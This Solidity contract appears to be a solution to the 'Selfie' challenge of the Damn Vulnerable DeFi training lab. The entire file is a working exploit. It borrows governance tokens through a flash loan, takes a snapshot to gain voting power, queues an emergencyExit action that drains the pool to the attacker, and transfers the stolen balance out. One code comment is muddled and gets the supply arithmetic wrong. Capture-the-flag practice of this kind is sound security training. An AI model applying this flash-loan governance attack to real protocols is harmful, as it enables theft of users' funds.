// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieExploit{
    ISimpleGovernance private SimpleGovernance;
    SelfiePool private selfiepool;
    DamnValuableTokenSnapshot private _governanceToken;

    uint actionId;


    constructor(address _SimpleGovernance, address _selfiepool, address governanceToken){
        SimpleGovernance = ISimpleGovernance(_SimpleGovernance);
        selfiepool = SelfiePool(_selfiepool);
        _governanceToken = DamnValuableTokenSnapshot(governanceToken);
    }

    function executeFlashLoan() public{
        uint amount = 1000001 * 10  ** 18; // totlasupply is 2 mil and 1000001 is greater than totoal supply;
        selfiepool.flashLoan(IERC3156FlashBorrower(address(this)),address(_governanceToken),amount,"");
    }

    function onFlashLoan(address thisaddress, address _token, uint _amount, uint some, bytes calldata _data) public returns(bytes32){
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)",address(this));
        _governanceToken.snapshot();
        actionId = SimpleGovernance.queueAction(address(selfiepool),0,data);
        _governanceToken.approve(address(selfiepool),_amount);        



        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeproposal() public{
        SimpleGovernance.executeAction(actionId);
    }

    function transferAmount(address receiver) public{
        uint balance = _governanceToken.balanceOf(address(this));
        _governanceToken.transfer(receiver,balance);
    }
}